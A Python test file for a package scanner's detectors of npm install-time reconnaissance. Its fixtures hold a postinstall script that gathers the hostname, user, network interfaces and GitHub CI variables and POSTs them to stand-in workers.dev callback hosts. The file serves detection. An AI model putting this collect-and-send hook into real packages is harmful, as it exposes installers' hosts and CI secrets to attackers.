# SPDX-License-Identifier: AGPL-3.0-or-later
"""npm install-time reconnaissance/collection detectors (brave-search class)."""
from __future__ import annotations

from pkgsentry.ecosystems.npm.installer import _recon_findings

# The real brave-search-mcp-server postinstall.js recon surface.
RECON = r'''
const os=require("os");const {execSync}=require("child_process");
os.hostname(); execSync("whoami"); os.networkInterfaces();
const r=process.env.GITHUB_REPOSITORY; const a=process.env.GITHUB_ACTOR;
fetch("https://callback-monitor.example.workers.dev/c",{method:"POST"});
'''


def _ids(content: str) -> set[str]:
    return {f.rule_id for f in _recon_findings(content, "postinstall.js")}


def test_full_recon_exfil_payload():
    ids = _ids(RECON)
    assert "installer.npm_install_host_recon" in ids
    assert "installer.npm_install_network_recon" in ids
    assert "installer.npm_install_ci_secret_harvest" in ids
    assert "installer.npm_install_recon_exfil" in ids  # the collect+send chain


def test_recon_without_child_process_still_chains():
    # Pure os.* recon + fetch, NO execSync — the FN shape the net_exec rule misses.
    content = 'const os=require("os");os.hostname();os.networkInterfaces();fetch("https://x.workers.dev/c",{method:"POST"})'
    ids = _ids(content)
    assert "installer.npm_install_recon_exfil" in ids


def test_recon_without_network_does_not_chain():
    content = 'const os=require("os");os.hostname();os.networkInterfaces();'
    ids = _ids(content)
    assert "installer.npm_install_host_recon" in ids
    assert "installer.npm_install_recon_exfil" not in ids  # collected but not sent


def test_benign_native_wrapper_no_fp():
    # Legit native wrapper checks os.platform/os.arch to pick a prebuilt binary.
    content = 'const os=require("os");if(os.platform()==="linux"&&os.arch()==="x64"){require("./bin/native-x64")}'
    assert _recon_findings(content, "install.js") == []


def test_plain_install_no_fp():
    assert _recon_findings('console.log("postinstall done");', "postinstall.js") == []
